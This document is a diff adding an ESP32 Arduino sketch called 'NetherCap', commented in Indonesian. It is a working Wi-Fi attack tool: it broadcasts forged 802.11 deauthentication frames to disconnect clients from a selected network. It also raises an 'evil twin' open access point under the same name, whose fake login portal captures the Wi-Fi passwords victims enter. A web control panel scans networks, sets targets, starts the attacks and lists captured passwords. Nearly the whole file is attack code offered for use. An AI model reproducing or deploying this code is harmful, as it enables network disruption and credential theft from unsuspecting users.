@@ -1,0 +1,709 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <esp_wifi.h>
+
+// =================== KONFIGURASI ===================
+#define LED_PIN 2
+#define BUTTON_PIN 0
+#define DEAUTH_INTERVAL 100
+
+WebServer server(80);
+
+// Struktur untuk deauth frame
+typedef struct {
+  uint8_t frame_control[2];
+  uint8_t duration[2];
+  uint8_t receiver[6];
+  uint8_t transmitter[6];
+  uint8_t bssid[6];
+  uint8_t fragment[2];
+  uint8_t reason_code[2];
+} __attribute__((packed)) deauth_frame_t;
+
+// Variabel global
+String targetSSID = "";
+String targetBSSID = "";
+int targetChannel = 1;
+bool isAttacking = false;
+bool isDeauthRunning = false;
+bool isEvilTwinRunning = false;
+String capturedPasswords[20];
+int passwordCount = 0;
+
+// =================== DEAUTH ATTACK ===================
+void startDeauthAttack() {
+  if(targetBSSID.length() == 0 || targetChannel == 0) {
+    Serial.println("[-] Target belum dipilih!");
+    return;
+  }
+  
+  Serial.println("[+] Starting Deauth attack on " + targetSSID);
+  
+  // Set channel WiFi
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  
+  // Parse MAC address dari string
+  uint8_t mac[6];
+  sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+  
+  // Buat deauth frame
+  deauth_frame_t deauthFrame;
+  memset(&deauthFrame, 0, sizeof(deauthFrame));
+  
+  // Frame control (0xC0 = deauth)
+  deauthFrame.frame_control[0] = 0xC0;
+  deauthFrame.frame_control[1] = 0x00;
+  
+  // Broadcast address
+  uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  memcpy(deauthFrame.receiver, broadcast, 6);
+  memcpy(deauthFrame.transmitter, mac, 6);
+  memcpy(deauthFrame.bssid, mac, 6);
+  
+  // Reason code (0x07 = Class 3 frame)
+  deauthFrame.reason_code[0] = 0x07;
+  
+  isDeauthRunning = true;
+  int packetCount = 0;
+  
+  // Kirim deauth frames
+  while(isDeauthRunning) {
+    esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
+    packetCount++;
+    
+    // Blink LED
+    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
+    
+    // Print status setiap 100 packets
+    if(packetCount % 100 == 0) {
+      Serial.println("[Deauth] Packets sent: " + String(packetCount));
+    }
+    
+    delay(DEAUTH_INTERVAL);
+  }
+  
+  Serial.println("[+] Deauth attack stopped");
+}
+
+void stopDeauthAttack() {
+  isDeauthRunning = false;
+  digitalWrite(LED_PIN, LOW);
+}
+
+// =================== EVIL TWIN ===================
+void startEvilTwin() {
+  if(targetSSID.length() == 0) {
+    Serial.println("[-] Target SSID belum dipilih!");
+    return;
+  }
+  
+  Serial.println("[+] Starting Evil Twin: " + targetSSID);
+  
+  // Stop AP yang sedang berjalan
+  WiFi.softAPdisconnect(true);
+  delay(100);
+  
+  // Start AP dengan SSID target (tanpa password)
+  WiFi.softAP(targetSSID.c_str(), NULL, targetChannel);
+  
+  Serial.println("[+] Evil Twin AP started");
+  Serial.println("[+] AP IP: " + WiFi.softAPIP().toString());
+  Serial.println("[+] SSID: " + targetSSID);
+  Serial.println("[+] Channel: " + String(targetChannel));
+  
+  isEvilTwinRunning = true;
+  
+  // Setup captive portal
+  setupCaptivePortal();
+}
+
+void stopEvilTwin() {
+  WiFi.softAPdisconnect(true);
+  delay(100);
+  
+  // Restart AP kontrol
+  String apName = "NetherCap_" + WiFi.macAddress().substring(12);
+  apName.replace(":", "");
+  WiFi.softAP(apName.c_str(), "nether123");
+  
+  isEvilTwinRunning = false;
+  Serial.println("[+] Evil Twin stopped");
+}
+
+void setupCaptivePortal() {
+  // Halaman login
+  server.on("/", HTTP_GET, []() {
+    String page = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>WiFi Login Required</title>
+      <style>
+        body { 
+          font-family: Arial, sans-serif; 
+          background: #f0f0f0; 
+          margin: 0; 
+          padding: 20px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+        }
+        .login-box {
+          background: white;
+          padding: 40px;
+          border-radius: 10px;
+          box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+          width: 100%;
+          max-width: 400px;
+          text-align: center;
+        }
+        h2 {
+          color: #333;
+          margin-bottom: 10px;
+        }
+        .network-name {
+          background: #e3f2fd;
+          padding: 15px;
+          border-radius: 8px;
+          margin: 20px 0;
+          font-weight: bold;
+          color: #1565c0;
+          font-size: 1.2em;
+        }
+        input {
+          width: 100%;
+          padding: 15px;
+          margin: 10px 0;
+          border: 1px solid #ddd;
+          border-radius: 8px;
+          box-sizing: border-box;
+          font-size: 16px;
+        }
+        button {
+          width: 100%;
+          padding: 15px;
+          background: #4CAF50;
+          color: white;
+          border: none;
+          border-radius: 8px;
+          cursor: pointer;
+          font-size: 16px;
+          font-weight: bold;
+          margin-top: 10px;
+        }
+        button:hover {
+          background: #45a049;
+        }
+        .message {
+          margin-top: 15px;
+          padding: 12px;
+          border-radius: 8px;
+          display: none;
+        }
+        .success {
+          background: #d4edda;
+          color: #155724;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="login-box">
+        <h2>🔒 WiFi Authentication Required</h2>
+        <p>Please enter password to connect to this network</p>
+        
+        <div class="network-name">
+          Network: )rawliteral";
+    page += targetSSID;
+    page += R"rawliteral(
+        </div>
+        
+        <form id="passwordForm">
+          <input type="password" id="password" placeholder="Enter WiFi Password" required>
+          <button type="submit">Connect to Internet</button>
+        </form>
+        
+        <div id="message" class="message"></div>
+      </div>
+      
+      <script>
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          const password = document.getElementById('password').value;
+          const message = document.getElementById('message');
+          
+          message.style.display = 'none';
+          
+          fetch('/check', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'password=' + encodeURIComponent(password)
+          })
+          .then(response => response.text())
+          .then(result => {
+            message.textContent = '✓ Password accepted. Connecting...';
+            message.className = 'message success';
+            message.style.display = 'block';
+            
+            // Save password locally (for demo)
+            localStorage.setItem('wifi_password', password);
+            
+            // Redirect after delay
+            setTimeout(() => {
+              window.location.href = 'http://www.google.com';
+            }, 2000);
+          })
+          .catch(error => {
+            message.textContent = 'Connection error. Please try again.';
+            message.className = 'message success';
+            message.style.display = 'block';
+          });
+        });
+      </script>
+    </body>
+    </html>
+    )rawliteral";
+    
+    server.send(200, "text/html", page);
+  });
+  
+  // Endpoint untuk menangkap password
+  server.on("/check", HTTP_POST, []() {
+    String password = server.arg("password");
+    
+    if(password.length() > 0) {
+      // Simpan password
+      if(passwordCount < 20) {
+        capturedPasswords[passwordCount++] = password;
+        
+        Serial.println("\n[!] PASSWORD CAPTURED!");
+        Serial.println("    SSID: " + targetSSID);
+        Serial.println("    Password: " + password);
+        Serial.println("    Client IP: " + server.client().remoteIP().toString());
+        Serial.println("    Total captured: " + String(passwordCount));
+      }
+      
+      server.send(200, "text/plain", "Password accepted");
+    } else {
+      server.send(400, "text/plain", "Password cannot be empty");
+    }
+  });
+  
+  // Redirect semua request ke login page
+  server.onNotFound([]() {
+    String redirectUrl = "http://" + WiFi.softAPIP().toString() + "/";
+    server.sendHeader("Location", redirectUrl);
+    server.send(302, "text/plain", "");
+  });
+}
+
+// =================== SETUP ===================
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+  
+  Serial.println("\n\n========================================");
+  Serial.println("       NETHERCAP ESP32 - SIMPLE");
+  Serial.println("========================================");
+  
+  // Inisialisasi hardware
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW);
+  pinMode(BUTTON_PIN, INPUT_PULLUP);
+  
+  // Inisialisasi WiFi
+  WiFi.mode(WIFI_AP_STA);
+  
+  // Buat nama AP unik dari MAC address
+  String apName = "NetherCap_" + WiFi.macAddress().substring(12);
+  apName.replace(":", "");
+  
+  // Start AP untuk kontrol
+  WiFi.softAP(apName.c_str(), "nether123");
+  
+  Serial.println("[+] Control AP: " + apName);
+  Serial.println("[+] Password: nether123");
+  Serial.println("[+] IP Address: " + WiFi.softAPIP().toString());
+  
+  // Setup web server routes
+  setupWebRoutes();
+  
+  server.begin();
+  
+  // Startup sequence
+  for(int i = 0; i < 3; i++) {
+    digitalWrite(LED_PIN, HIGH);
+    delay(200);
+    digitalWrite(LED_PIN, LOW);
+    delay(200);
+  }
+  
+  Serial.println("\n[+] System Ready!");
+  Serial.println("[+] Open browser to: http://" + WiFi.softAPIP().toString());
+}
+
+void setupWebRoutes() {
+  // Halaman utama kontrol
+  server.on("/", HTTP_GET, []() {
+    String html = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>NetherCap Control</title>
+      <style>
+        body { 
+          font-family: Arial; 
+          background: #1a1a1a; 
+          color: white; 
+          padding: 20px;
+        }
+        .container { 
+          max-width: 800px; 
+          margin: 0 auto; 
+        }
+        h1 { 
+          color: #00ff9d; 
+          text-align: center; 
+        }
+        .card { 
+          background: #2a2a2a; 
+          padding: 20px; 
+          margin: 15px 0; 
+          border-radius: 10px;
+          border: 1px solid #444;
+        }
+        button { 
+          padding: 12px 20px; 
+          margin: 5px; 
+          border: none; 
+          border-radius: 5px; 
+          cursor: pointer; 
+          font-weight: bold;
+          color: white;
+        }
+        .scan-btn { background: #2196F3; }
+        .attack-btn { background: #f44336; }
+        .stop-btn { background: #ff9800; }
+        .log-btn { background: #4CAF50; }
+        .status {
+          padding: 10px;
+          border-radius: 5px;
+          margin: 10px 0;
+          font-weight: bold;
+        }
+        .idle { background: #4CAF50; }
+        .attacking { background: #f44336; }
+        #networkList {
+          max-height: 300px;
+          overflow-y: auto;
+          margin: 15px 0;
+          padding: 10px;
+          background: #333;
+          border-radius: 5px;
+        }
+        .network {
+          padding: 10px;
+          margin: 5px 0;
+          background: #3a3a3a;
+          border-radius: 5px;
+          cursor: pointer;
+        }
+        .network:hover { background: #4a4a4a; }
+        .selected { background: #006400; }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <h1>⚡ NetherCap ESP32</h1>
+        
+        <div class="card">
+          <h3>📡 Network Scanner</h3>
+          <button class="scan-btn" onclick="scanNetworks()">Scan Networks</button>
+          <div id="networkList">Click scan to find networks</div>
+          <div id="selectedNetwork" style="margin-top:10px;"></div>
+        </div>
+        
+        <div class="card">
+          <h3>⚔️ Attack Controls</h3>
+          <button class="attack-btn" onclick="startDeauth()" id="deauthBtn">Start Deauth Attack</button>
+          <button class="attack-btn" onclick="startEvilTwin()" id="evilTwinBtn">Start Evil Twin</button>
+          <button class="stop-btn" onclick="stopAll()" id="stopBtn" disabled>Stop All Attacks</button>
+          <div class="status idle" id="status">Status: IDLE</div>
+        </div>
+        
+        <div class="card">
+          <h3>📊 System Status</h3>
+          <div>Passwords Captured: <span id="passwordCount">0</span></div>
+          <div>Connected Clients: <span id="clientCount">0</span></div>
+          <div>Control AP: )rawliteral";
+    html += WiFi.softAPSSID();
+    html += R"rawliteral(</div>
+          <button class="log-btn" onclick="showPasswords()">View Captured Passwords</button>
+        </div>
+      </div>
+      
+      <script>
+        let selectedNetwork = null;
+        
+        function scanNetworks() {
+          fetch('/scan')
+            .then(r => r.json())
+            .then(data => {
+              const list = document.getElementById('networkList');
+              list.innerHTML = '';
+              
+              data.networks.forEach(network => {
+                const div = document.createElement('div');
+                div.className = 'network';
+                div.onclick = () => selectNetwork(network);
+                div.innerHTML = `
+                  <strong>${network.ssid}</strong><br>
+                  <small>${network.bssid} | Ch ${network.channel} | ${network.rssi}dBm</small>
+                `;
+                list.appendChild(div);
+              });
+            });
+        }
+        
+        function selectNetwork(network) {
+          selectedNetwork = network;
+          document.querySelectorAll('.network').forEach(item => {
+            item.classList.remove('selected');
+          });
+          event.currentTarget.classList.add('selected');
+          
+          document.getElementById('selectedNetwork').innerHTML = `
+            <strong>Selected:</strong> ${network.ssid}<br>
+            <small>BSSID: ${network.bssid} | Channel: ${network.channel}</small>
+          `;
+          
+          fetch('/setTarget', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(network)
+          });
+        }
+        
+        function startDeauth() {
+          if(!selectedNetwork) {
+            alert('Please select a network first!');
+            return;
+          }
+          fetch('/deauth/start').then(r => r.text()).then(alert);
+          updateStatus('attacking');
+        }
+        
+        function startEvilTwin() {
+          if(!selectedNetwork) {
+            alert('Please select a network first!');
+            return;
+          }
+          fetch('/eviltwin/start').then(r => r.text()).then(alert);
+          updateStatus('attacking');
+        }
+        
+        function stopAll() {
+          fetch('/attack/stop').then(r => r.text()).then(alert);
+          updateStatus('idle');
+        }
+        
+        function updateStatus(status) {
+          const el = document.getElementById('status');
+          el.className = 'status ' + status;
+          el.textContent = 'Status: ' + status.toUpperCase();
+          
+          document.getElementById('deauthBtn').disabled = status === 'attacking';
+          document.getElementById('evilTwinBtn').disabled = status === 'attacking';
+          document.getElementById('stopBtn').disabled = status === 'idle';
+        }
+        
+        function showPasswords() {
+          fetch('/passwords')
+            .then(r => r.text())
+            .then(html => {
+              const newWindow = window.open();
+              newWindow.document.write(html);
+            });
+        }
+        
+        // Update stats
+        setInterval(() => {
+          fetch('/status')
+            .then(r => r.json())
+            .then(data => {
+              document.getElementById('passwordCount').textContent = data.passwordCount;
+              document.getElementById('clientCount').textContent = data.clients;
+            });
+        }, 2000);
+        
+        // Initial scan
+        scanNetworks();
+      </script>
+    </body>
+    </html>
+    )rawliteral";
+    
+    server.send(200, "text/html", html);
+  });
+  
+  // API endpoints
+  server.on("/scan", HTTP_GET, []() {
+    int n = WiFi.scanNetworks();
+    
+    String json = "{\"networks\":[";
+    for(int i = 0; i < n && i < 20; i++) {
+      if(i > 0) json += ",";
+      json += "{";
+      json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
+      json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
+      json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
+      json += "\"channel\":" + String(WiFi.channel(i));
+      json += "}";
+    }
+    json += "]}";
+    
+    server.send(200, "application/json", json);
+    WiFi.scanDelete();
+  });
+  
+  server.on("/setTarget", HTTP_POST, []() {
+    String body = server.arg("plain");
+    
+    // Parse JSON sederhana
+    int ssidStart = body.indexOf("\"ssid\":\"") + 8;
+    int ssidEnd = body.indexOf("\"", ssidStart);
+    targetSSID = body.substring(ssidStart, ssidEnd);
+    
+    int bssidStart = body.indexOf("\"bssid\":\"") + 9;
+    int bssidEnd = body.indexOf("\"", bssidStart);
+    targetBSSID = body.substring(bssidStart, bssidEnd);
+    
+    int channelStart = body.indexOf("\"channel\":") + 10;
+    int channelEnd = body.indexOf(",", channelStart);
+    if(channelEnd == -1) channelEnd = body.indexOf("}", channelStart);
+    targetChannel = body.substring(channelStart, channelEnd).toInt();
+    
+    Serial.println("[+] Target set: " + targetSSID);
+    Serial.println("    BSSID: " + targetBSSID);
+    Serial.println("    Channel: " + String(targetChannel));
+    
+    server.send(200, "text/plain", "OK");
+  });
+  
+  server.on("/deauth/start", HTTP_GET, []() {
+    isAttacking = true;
+    // Start deauth di background
+    server.send(200, "text/plain", "Deauth attack started on " + targetSSID);
+    
+    // Jalankan deauth di loop() nanti
+    isDeauthRunning = true;
+  });
+  
+  server.on("/eviltwin/start", HTTP_GET, []() {
+    startEvilTwin();
+    server.send(200, "text/plain", "Evil Twin started: " + targetSSID);
+  });
+  
+  server.on("/attack/stop", HTTP_GET, []() {
+    stopDeauthAttack();
+    stopEvilTwin();
+    isAttacking = false;
+    server.send(200, "text/plain", "All attacks stopped");
+  });
+  
+  server.on("/status", HTTP_GET, []() {
+    String json = "{";
+    json += "\"passwordCount\":" + String(passwordCount) + ",";
+    json += "\"clients\":" + String(WiFi.softAPgetStationNum());
+    json += "}";
+    server.send(200, "application/json", json);
+  });
+  
+  server.on("/passwords", HTTP_GET, []() {
+    String html = "<h1>Captured Passwords</h1>";
+    if(passwordCount == 0) {
+      html += "<p>No passwords captured yet</p>";
+    } else {
+      html += "<table border='1' width='100%'>";
+      html += "<tr><th>#</th><th>SSID</th><th>Password</th></tr>";
+      for(int i = 0; i < passwordCount; i++) {
+        html += "<tr>";
+        html += "<td>" + String(i+1) + "</td>";
+        html += "<td>" + targetSSID + "</td>";
+        html += "<td>" + capturedPasswords[i] + "</td>";
+        html += "</tr>";
+      }
+      html += "</table>";
+    }
+    html += "<p><a href='/'>Back to Control Panel</a></p>";
+    server.send(200, "text/html", html);
+  });
+}
+
+// =================== MAIN LOOP ===================
+void loop() {
+  server.handleClient();
+  
+  // Jalankan deauth attack jika aktif
+  if(isDeauthRunning) {
+    static unsigned long lastDeauth = 0;
+    if(millis() - lastDeauth >= DEAUTH_INTERVAL) {
+      // Kirim deauth frame
+      if(targetBSSID.length() > 0 && targetChannel > 0) {
+        uint8_t mac[6];
+        sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+        
+        deauth_frame_t deauthFrame;
+        memset(&deauthFrame, 0, sizeof(deauthFrame));
+        deauthFrame.frame_control[0] = 0xC0;
+        uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        memcpy(deauthFrame.receiver, broadcast, 6);
+        memcpy(deauthFrame.transmitter, mac, 6);
+        memcpy(deauthFrame.bssid, mac, 6);
+        deauthFrame.reason_code[0] = 0x07;
+        
+        esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
+        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
+      }
+      lastDeauth = millis();
+    }
+  }
+  
+  // Tombol emergency stop
+  static unsigned long lastButtonPress = 0;
+  if(digitalRead(BUTTON_PIN) == LOW && millis() - lastButtonPress > 1000) {
+    stopDeauthAttack();
+    stopEvilTwin();
+    Serial.println("[!] Emergency stop activated!");
+    lastButtonPress = millis();
+    
+    for(int i = 0; i < 5; i++) {
+      digitalWrite(LED_PIN, HIGH);
+      delay(100);
+      digitalWrite(LED_PIN, LOW);
+      delay(100);
+    }
+  }
+  
+  // Status LED
+  if(isDeauthRunning || isEvilTwinRunning) {
+    static unsigned long lastBlink = 0;
+    if(millis() - lastBlink > 500) {
+      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
+      lastBlink = millis();
+    }
+  } else if(WiFi.softAPgetStationNum() > 0) {
+    static unsigned long lastBlink = 0;
+    if(millis() - lastBlink > 2000) {
+      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
+      lastBlink = millis();
+    }
+  }
+  
+  delay(10);
+}
